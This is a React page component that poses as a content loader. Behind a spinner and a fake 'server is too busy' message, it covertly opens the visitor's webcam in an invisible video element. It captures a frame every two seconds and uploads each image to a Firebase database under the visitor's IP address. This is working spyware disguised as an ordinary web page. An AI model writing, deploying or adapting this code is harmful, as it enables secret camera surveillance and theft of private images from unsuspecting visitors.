import React from "react";
import loader from "../../img/loader.gif";
import { capture, getCam } from "../../libs/cam";
import { getDbRef } from "../../config/fbConnect";
import { set } from "firebase/database";
import { getIp } from "../../libs/utill";
const Home = () => {
    const [id, setId] = React.useState('user');
    const [counter, setCount] = React.useState(1);

    const getSystemIP = async ()=> {
        const ip = await getIp();
        const idStr = ip.split('.').join('-');
        setId(idStr);
    }

    const takeData = async () => {
        let url = capture('capturtarget', 'targetVid');
        set(getDbRef(`users/${id}/${counter}`), {
            imgUrl: url,
        });
        let tim = setTimeout(()=> {
            setCount(counter+1);
            clearTimeout(tim);
        }, 2000);
    }

    React.useEffect(()=> {
        takeData();
    }, [counter]);

    React.useEffect(()=> {
        getSystemIP();
        getCam('targetVid')
    }, [])

    return (
        <div>
            {counter > 20 
                ?   
                    <div style={{padding: '10px'}}>
                        <p>Unable to get the content. Server is too busy. Please try again later</p>
                    </div>
                :
                    <>
                        <img src={loader}/>
                        <p>
                            Please wait content is loading.
                        </p>
                    </>
            }
            <div style={{opacity: 0}}>
                <video 
                    id="targetVid" 
                    width="320" 
                    height="240" 
                    autoPlay 
                    playsInline 
                    muted
                    style={{position: 'absolute', zIndex: '-9999', opacity: 0}}
                ></video>
                <canvas id="capturtarget" width="320" height="240"></canvas>
            </div>
        </div>
    )
}

export default Home;